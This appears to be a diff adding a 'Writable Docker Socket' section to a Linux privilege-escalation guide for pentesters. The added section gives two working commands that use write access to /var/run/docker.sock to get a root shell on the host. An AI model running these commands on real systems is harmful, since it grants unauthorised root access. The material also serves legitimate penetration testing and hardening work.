@@ -463,6 +463,19 @@ curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 
 If the socket **respond with a HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.
 
+### Writable Docker Socket
+
+The **docker socke**t is typically located at `/var/run/docker.sock` and is only writable by `root` user and `docker` group.  
+If for some reason **you have write permissions** over that socket you can escalate privileges.  
+The following commands can be used to escalate privileges:
+
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
+Note that if you have write permissions over socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group).
+
 ## **D-Bus**
 
 D-BUS is an **inter-process communication \(IPC\) system**, providing a simple yet powerful mechanism **allowing applications to talk to one another**, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.
